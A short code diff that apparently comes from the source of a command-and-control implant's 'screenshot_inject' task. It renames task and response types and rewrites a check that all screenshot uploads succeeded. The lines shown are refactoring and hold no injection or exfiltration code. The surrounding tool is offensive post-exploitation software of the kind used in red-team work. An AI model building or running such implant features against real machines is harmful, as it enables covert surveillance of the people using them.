@@ -59,7 +59,7 @@ namespace Tasks
 
         private bool _completed = false;
 
-        public screenshot_inject(IAgent agent, ApolloInterop.Structs.MythicStructs.Task data) : base(agent, data)
+        public screenshot_inject(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
         {
             _sendAction = (object p) =>
             {
@@ -119,7 +119,7 @@ namespace Tasks
 
         public override void Start()
         {
-            TaskResponse resp;
+            MythicTaskResponse resp;
             try
             {
                 ScreenshotInjectParameters parameters = _jsonSerializer.Deserialize<ScreenshotInjectParameters>(_data.Parameters);
@@ -198,7 +198,8 @@ namespace Tasks
                                     };
                                     WaitHandle.WaitAny(waiters);
                                     ST.Task.WaitAll(uploadTasks.ToArray());
-                                    bool bRet = uploadTasks.Where(t => t.Result == false).ToArray().Length == 0;
+                                    //bool bRet = uploadTasks.Where(t => t.Result == false).ToArray().Length == 0;
+                                    bool bRet = uploadTasks.All(t => t.Result is true);
                                     if (bRet)
                                     {
                                         resp = CreateTaskResponse("", true, "completed");
